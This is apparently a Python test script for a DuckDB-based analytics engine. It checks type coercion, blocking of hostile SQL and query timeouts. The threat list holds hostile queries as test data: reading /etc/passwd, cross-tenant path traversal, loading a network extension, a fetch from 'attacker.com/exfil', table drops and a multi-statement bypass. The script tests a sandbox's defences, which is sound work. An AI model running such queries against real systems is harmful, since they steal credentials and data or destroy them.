import asyncio
import pandas as pd
import duckdb
from app.services.analytics.db_engine import DBEngine
from app.services.security.sandbox import QueryExecutionError
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

async def test_phase1_comprehensive():
    print("--- Starting Phase 1 Comprehensive Validation ---")
    
    # 1. COERCION EDGE CASES
    print("\n--- Testing Coercion Pipeline ---")
    data = {
        "Product": ["A", "B", "C", "D", "E"],
        "price_usd": ["$1,200.50", "$850.00", "na", "$2,100.99", "$99.99"],
        "growth_pct": ["10.5%", "-2.1%", "0.0%", "15.2%", "5.5%"],
        "accounting_neg": ["(1,500.00)", "200.00", "(50.50)", "10.00", "0.00"],
        "euro_format": ["1.500,00", "850,00", "2.100,99", "10,50", "99,99"], # Not supported yet natively, should stay VARCHAR or coerce if we added pattern
        "null_test": ["N/A", "Unknown", "--", "None", "Valid_String"],
        "stay_varchar": ["12 months", "6 months", "24 months", "1 month", "3 months"],
        "partial_coerce": ["$100", "$200", "Free", "Gift", "N/A"] # < 95% success rate, should stay VARCHAR
    }
    df = pd.DataFrame(data)
    
    db = DBEngine()
    print("Loading dataframe (Sequence: materialization -> coercion -> lockdown)...")
    db.load_dataframe("data", df)
    
    schema = db.extract_schema("data")
    col_meta = schema.get("column_metadata", {})
    columns = schema.get("columns", {})
    
    for col in columns:
        meta = col_meta.get(col, {})
        coerced = meta.get("coerced", False)
        print(f"Column: {col:<15} | Type: {columns[col]:<8} | Coerced: {coerced}")

    # 2. SANDBOX THREAT VECTORS
    print("\n--- Testing Sandbox Threat Vectors ---")
    
    threat_queries = [
        ("File Read Passwd", "SELECT * FROM read_csv('/etc/passwd')"),
        ("Directory Traversal", "SELECT * FROM '../other_tenant/data.csv'"),
        ("HTTP Extension", "INSTALL httpfs; LOAD httpfs;"),
        ("HTTP Exfil", "SELECT * FROM 'https://attacker.com/exfil'"),
        ("Drop Table", "DROP TABLE data;"),
        ("Drop View", "DROP VIEW data;"),
        ("Arbitrary Table", "SELECT * FROM arbitrary_table"),
        ("Multi-statement bypass", "SELECT 1; INSTALL httpfs; LOAD httpfs;"),
        ("Valid Scoped Query", "SELECT Product, SUM(price_usd) as total FROM data GROUP BY 1"),
    ]

    for name, query in threat_queries:
        try:
            res = await db.execute_query(query)
            if name == "Valid Scoped Query":
                print(f"[PASS] {name}: Executed successfully as expected.")
            else:
                print(f"[FAIL] {name}: Query somehow executed without error!")
        except Exception as e:
            if name == "Valid Scoped Query":
                print(f"[FAIL] {name}: Failed unexpectedly with {e}")
            else:
                print(f"[PASS] {name}: Blocked -> {e}")

    # 3. TIMEOUT LIMITS
    print("\n--- Testing Query Timeouts ---")
    try:
        # Cross join explosion
        query = "SELECT count(*) FROM data a, data b, data c, data d, data e, data f, data g"
        # Since db_engine.py defaults to 30, we can pass a small timeout to test the mechanism itself
        print("Testing mechanism with 1s timeout...")
        await db.execute_query(query, timeout_seconds=1)
        print("[FAIL] Query explosion completed without timeout.")
    except Exception as e:
        print(f"[PASS] Caught Expected Timeout: {e}")

    db.close()
    print("\n--- Phase 1 Validation Completed ---")

if __name__ == "__main__":
    asyncio.run(test_phase1_comprehensive())
